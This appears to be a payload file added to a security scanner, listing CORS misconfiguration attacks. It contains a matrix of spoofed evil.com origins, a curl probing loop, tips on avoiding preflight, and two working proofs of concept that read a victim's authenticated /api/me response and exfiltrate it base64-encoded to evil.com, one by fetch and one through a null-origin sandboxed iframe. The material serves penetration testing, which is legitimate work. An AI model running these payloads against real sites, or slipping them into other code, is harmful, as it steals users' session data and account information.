@@ -1,0 +1,39 @@
+# CORS Misconfiguration Payloads — cyberm4fia-scanner
+# Categories: Origin Test Matrix, Credential Exfil, Null Origin
+
+# ─── Origin Test Matrix ───
+Origin: https://evil.com
+Origin: null
+Origin: https://target.com.evil.com
+Origin: https://evil.target.com
+Origin: https://evil-target.com
+Origin: https://target.com\.evil.com
+Origin: https://target.com%60.evil.com
+Origin: https://target.com.
+Origin: https://target.com:443@evil.com
+Origin: https://xyztarget.com
+Origin: http://target.com
+
+# ─── CORS One-liner Test ───
+for o in https://evil.com null https://t.com.evil.com https://evil.t.com https://t.com.; do
+  r=$(curl -sk -H "Origin: $o" -I "https://TARGET/api/me")
+  echo "=== $o ==="; echo "$r" | grep -i '^access-control-'
+done
+
+# ─── Credential Exfil PoC ───
+<!DOCTYPE html>
+<html><body><script>
+fetch('https://target.com/api/me',{credentials:'include'})
+ .then(r=>r.text()).then(t=>fetch('https://evil.com/log?d='+btoa(t)));
+</script></body></html>
+
+# ─── Null Origin via Sandboxed Iframe ───
+<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="
+<script>
+fetch('https://target.com/api/me',{credentials:'include'})
+ .then(r=>r.text()).then(t=>top.location='https://evil.com/?d='+btoa(t));
+</script>"></iframe>
+
+# ─── Pre-flight Bypass ───
+# text/plain, application/x-www-form-urlencoded, multipart/form-data avoid pre-flight
+# Test state-change via POST with Content-Type: text/plain
